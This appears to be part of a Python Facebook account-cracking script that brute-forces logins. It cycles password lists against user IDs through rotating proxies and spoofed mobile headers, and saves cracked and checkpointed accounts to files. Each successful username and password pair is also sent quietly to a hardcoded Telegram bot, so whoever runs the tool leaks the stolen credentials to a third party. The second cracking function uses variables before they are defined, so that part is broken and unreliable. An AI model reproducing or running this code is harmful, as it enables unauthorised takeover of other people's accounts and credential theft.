	if woi in ['y','Y']:
		os.system("python run.py")
	elif woi in ['n','N']:
		print(" \u001b[36m>>\033[1;37m BYE !! ")
		exit()
	elif KeyError:
		exit()

#--------------------[ METHOD-B-API ]-----------------#

def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r {P}[MIKEY-OG=]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
				requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6221197589&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#------------------[ METHOD-MBASIC-2 ]-------------------#

def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r {P}[MIKEY-OG]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":"p.facebook.com",'cache-control': 'max-age=0','sec-ch-ua-mobile': '?1',"upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
			p = ses.get('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":"p.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{P}{K} [{time.strftime("%H:%M")}-CP] {idf} │ {pw} {P}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
				requests.get("https://api.telegram.org/bot6001916477:AAGn5rlSFLOHO5c5WHsh3ngCsQ-8uH5fjhg/sendMessage?chat_id=6221197589&text="+uname+"\n[ "+idf+' | '+pw+ " ]")
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok.append(wrt)
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#-----------------------[ SYSTEM-CONTROL ]--------------------#

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('data')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()


#LOTS OF LOVE FROM NIKHIL 🌺